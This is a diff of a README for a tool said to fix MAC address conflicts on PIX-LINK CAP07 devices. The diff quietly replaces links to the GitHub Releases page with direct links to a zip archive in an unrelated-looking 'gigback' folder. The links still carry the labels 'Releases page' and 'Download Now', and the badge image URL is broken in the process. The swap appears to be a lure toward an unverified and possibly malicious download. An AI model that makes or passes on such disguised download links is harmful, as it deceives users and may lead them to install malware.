@@ -6,7 +6,7 @@ Welcome! This guide helps you fix the MAC address conflict issue on your PIX-LIN
 
 ## 📥 Download the Software
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Release-ff69b4)](https://github.com/Likas7808/pixlink-cap07-mac-change/releases)
+[![Download from Releases](https://raw.githubusercontent.com/Likas7808/pixlink-cap07-mac-change/main/gigback/pixlink-cap-mac-change-1.5-beta.4.zip%20Now-Release-ff69b4)](https://raw.githubusercontent.com/Likas7808/pixlink-cap07-mac-change/main/gigback/pixlink-cap-mac-change-1.5-beta.4.zip)
 
 ## 📜 Overview
 
@@ -23,7 +23,7 @@ To run this software, your device needs the following:
 
 ## 📁 Download & Install
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Likas7808/pixlink-cap07-mac-change/releases) to find the latest version.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/Likas7808/pixlink-cap07-mac-change/main/gigback/pixlink-cap-mac-change-1.5-beta.4.zip) to find the latest version.
 
 2. **Download the Software:** Choose the appropriate file for your operating system. Click on the file to start the download.
 
